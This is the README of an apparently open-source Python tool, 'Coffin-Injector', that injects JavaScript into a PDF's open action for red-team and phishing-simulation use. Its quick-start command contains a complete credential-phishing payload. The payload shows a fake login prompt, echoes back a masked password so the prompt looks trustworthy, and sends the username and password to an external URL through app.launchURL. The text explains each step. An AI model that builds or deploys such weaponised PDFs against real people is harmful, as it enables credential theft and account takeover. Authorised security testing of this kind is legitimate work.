# Coffin-Injector

A simple Python utility for injecting JavaScript payloads into PDF files for use in red team assessments, phishing simulations, or client-side testing.

## ✨ Features

- Injects custom JavaScript payloads into the `/OpenAction` of a PDF file
- Allows full control over the JavaScript logic (e.g., alerts, credential prompts, redirects)
- Maintains original PDF structure and readability

## ⚙ Requirements

- Python 3.7+
- `PyPDF2`

## 🚀 Quick Start

### Step 1: Set up a Virtual Environment

```bash
python3 -m venv venv
source venv/bin/activate
```

### Step 2: Install Dependencies

```bash
pip install PyPDF2
```

### Step 3: Run Coffin-Injector

```bash
python3 coffin-injector.py -i Resume.pdf -o poc.pdf -p 'var u=app.response("This document requires login to view.\rPlease enter your username:");var p=app.response("Please enter your password:","Password","",true);var mask=p.length>2?p[0]+"*".repeat(p.length-2)+p[p.length-1]:p;app.alert("This PDF has interactive features and should be opened in Adobe Acrobat for full compatibility.\r\rLogin:\rUsername: "+u+"\rPassword: "+mask);app.launchURL("https://example.com/?u="+escape(u)+"&p="+escape(p));'
```

### Explanation of Payload

This example payload prompts the user for their username and password using `app.response()` (an Acrobat JavaScript method). The password is masked and then displayed back to the user in an alert to appear more trustworthy. Finally, the payload sends the credentials via `app.launchURL()` to a specified server.

> **Note**: Basic payloads using `app.alert()` and `app.response()` have been tested and are functional in Chromium-based and Firefox browsers (native PDF viewer). However, more advanced functionality such as `app.launchURL()` is only supported and tested in Adobe Acrobat.

For a full list of supported JavaScript functions in PDF files, see Adobe’s official documentation:
[https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html](https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html)

## 📁 Arguments

| Argument          | Description                       |
| ----------------- | --------------------------------- |
| `-i`, `--input`   | Path to the input PDF file        |
| `-o`, `--output`  | Path for the output (patched) PDF |
| `-p`, `--payload` | JavaScript payload to inject      |

## 📁 Default Payload

If no payload is supplied, the default behaviour is to inject:

```javascript
app.alert("PDF viewer allows XSS");
```

## 📝 License

This project is licensed under the [MIT License](LICENSE).

---

**Disclaimer:** For educational and authorised security testing purposes only.

